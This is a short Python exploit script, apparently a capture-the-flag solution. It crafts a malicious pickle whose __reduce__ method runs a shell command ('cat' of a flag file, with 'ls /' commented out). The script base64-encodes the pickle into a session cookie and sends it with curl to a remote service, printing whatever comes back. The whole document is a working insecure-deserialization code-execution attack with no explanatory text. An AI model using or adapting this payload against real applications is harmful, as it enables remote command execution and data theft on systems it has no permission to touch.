import pickle
from subprocess import check_output
from base64 import b64encode
from os import popen

class exp:
    def __reduce__(self):
        #return (check_output, (['ls', '/'],))
        return (check_output, (['cat', '/flag_5fb2acebf1d0c558'],))

session = b64encode(pickle.dumps({'name': exp(), 'age': 1}))
output = popen("curl http://h4ck3r.quest:8600/ --cookie 'session=" \
+ session.decode() + "'").read()
#print(output.replace('\\n', '\n'))
print(output)